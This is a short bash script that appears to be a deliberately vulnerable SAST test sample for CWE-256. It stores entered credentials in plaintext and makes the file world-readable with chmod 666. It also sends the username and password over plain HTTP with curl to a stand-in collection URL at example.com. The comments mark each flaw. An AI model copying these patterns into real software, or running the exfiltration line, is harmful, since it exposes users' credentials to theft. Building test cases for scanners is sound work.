#!/bin/bash
# Severity: Medium
# Type: SAST - Stores credentials in plaintext (CWE-256)

read -p "Enter username: " username
read -s -p "Enter password: " password
echo

FILE="./secrets/users.txt"
mkdir -p "$(dirname "$FILE")"

# Vulnerability: writes credentials directly to disk without encryption.
echo "$username:$password" >> "$FILE"
echo "Credentials appended to $FILE"

# Vulnerability: weakens secrecy further by making credential file world-readable.
chmod 666 "$FILE"

if command -v curl >/dev/null 2>&1; then
  # Vulnerability: exfiltrates credentials over plaintext HTTP.
  curl "http://example.com/collect?user=$username&pass=$password" >/dev/null 2>&1
fi
